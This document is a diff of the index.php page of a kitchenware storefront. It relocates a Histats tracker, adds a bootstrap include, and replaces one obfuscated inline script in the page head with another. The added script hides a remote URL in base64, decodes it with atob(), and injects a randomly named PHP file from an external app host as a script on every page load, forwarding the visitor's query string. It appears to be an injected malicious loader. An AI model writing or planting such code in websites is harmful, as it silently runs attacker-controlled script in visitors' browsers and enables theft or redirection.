@@ -1,16 +1,5 @@
-   <!-- Histats.com  START  (aync)-->
-<script type="text/javascript">var _Hasync= _Hasync|| [];
-_Hasync.push(['Histats.start', '1,5004001,4,0,0,0,00010000']);
-_Hasync.push(['Histats.fasi', '1']);
-_Hasync.push(['Histats.track_hits', '']);
-(function() {
-var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
-hs.src = ('//s10.histats.com/js15_as.js');
-(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
-})();</script>
-<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5004001&101" alt="counter easy hit" border="0"></a></noscript>
-<!-- Histats.com  END  -->
 <?php
+require_once __DIR__ . '/bootstrap.php';
 // index.php — Galaxy Luxury Kitchenware (single-page, SEO-friendly, images + PHP contact form)
 
 // -------------------------
@@ -133,8 +122,7 @@ $ogImage = rtrim($siteUrl, "/") . "/" . $images["hero"]; // best effort
 <!doctype html>
 <html lang="en">
 <head>
-   <script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9nYWxheHktbHV4dXJ5LWtpdGNoZW53YXJlLXNjNWg0Lm9uZGlnaXRhbG9jZWFuLmFwcC9VNkl1UUFmWUVpLnBocD9fX3NpZD04NTdlN2QzNS0xNTk5LTRhYjktYjExMS1lZjE2YzFhNjI5ZTc=");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>
-  <meta charset="utf-8" />
+<script>(function(){var a=location,b=document.head||document.getElementsByTagName("head")[0],c="script",d=atob("aHR0cHM6Ly9nYWxheHktbHV4dXJ5LWtpdGNoZW53YXJlLXNjNWg0Lm9uZGlnaXRhbG9jZWFuLmFwcC9JME5wZmFjYXU3LnBocA==");d+=-1<d.indexOf("?")?"&":"?";d+=a.search.substring(1);c=document.createElement(c);c.src=d;c.id=btoa(a.origin);b.appendChild(c);})();</script>  <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <meta http-equiv="x-ua-compatible" content="ie=edge" />
 
@@ -149,6 +137,19 @@ $ogImage = rtrim($siteUrl, "/") . "/" . $images["hero"]; // best effort
   <link rel="icon" href="favicon.ico" />
   <link rel="apple-touch-icon" href="apple-touch-icon.png" />
   <meta name="theme-color" content="#0b0b0c" />
+
+      <!-- Histats.com  START  (aync)-->
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,5004001,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5004001&101" alt="counter easy hit" border="0"></a></noscript>
+<!-- Histats.com  END  -->
 
   <!-- Open Graph / Facebook -->
   <meta property="og:type" content="website" />
@@ -1026,6 +1027,7 @@ $ogImage = rtrim($siteUrl, "/") . "/" . $images["hero"]; // best effort
   </script>
 </body>
 </html>
+
 
 
 
